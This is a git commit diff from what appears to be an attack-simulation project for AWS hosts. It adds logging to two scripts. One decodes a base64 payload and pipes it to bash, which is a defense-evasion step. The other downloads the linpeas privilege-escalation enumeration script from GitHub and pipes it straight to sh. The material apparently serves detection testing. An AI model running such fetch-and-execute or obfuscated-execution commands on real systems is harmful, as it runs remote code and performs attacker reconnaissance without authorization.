a31a852c6346fa1f72b97b53b2b441f0fad36d92
credibleforce <jamiefrasermcmurray@gmail.com>
2023-04-24 18:49:15 -0700

    update

--- terraform/modules/attack/simulate/aws/modules/ssm/execute-composite-host-compromise/resources/linux/defense_evasions_base64_shell.sh
+++ terraform/modules/attack/simulate/aws/modules/ssm/execute-composite-host-compromise/resources/linux/defense_evasions_base64_shell.sh
@@ -1,4 +1,10 @@
 #!/bin/bash
-
+SCRIPTNAME="bash64"
+LOGFILE=/tmp/$SCRIPTNAME.log
+function log {
+    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
+    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
+}
+truncate -s 0 $LOGFILE
 $PAYLOAD=$(echo -en '#!/bin/bash\necho test\n' | base64)
-echo -n $PAYLOAD | base64 -d /bin/bash
+echo -n $PAYLOAD | base64 -d | /bin/bash - >> $LOGFILE 2>&1
--- terraform/modules/attack/simulate/aws/modules/ssm/execute-composite-host-compromise/resources/linux/discovery_capabilities_linpeas.sh
+++ terraform/modules/attack/simulate/aws/modules/ssm/execute-composite-host-compromise/resources/linux/discovery_capabilities_linpeas.sh
@@ -1,2 +1,12 @@
 #!/bin/bash
-curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+SCRIPTNAME="linpeas"
+LOGFILE=/tmp/$SCRIPTNAME.log
+function log {
+    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
+    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
+}
+truncate -s 0 $LOGFILE
+log "Starting..."
+log "Downloading latest linpeas and executing..."
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh >> $LOGFILE 2>&1
+log "done."
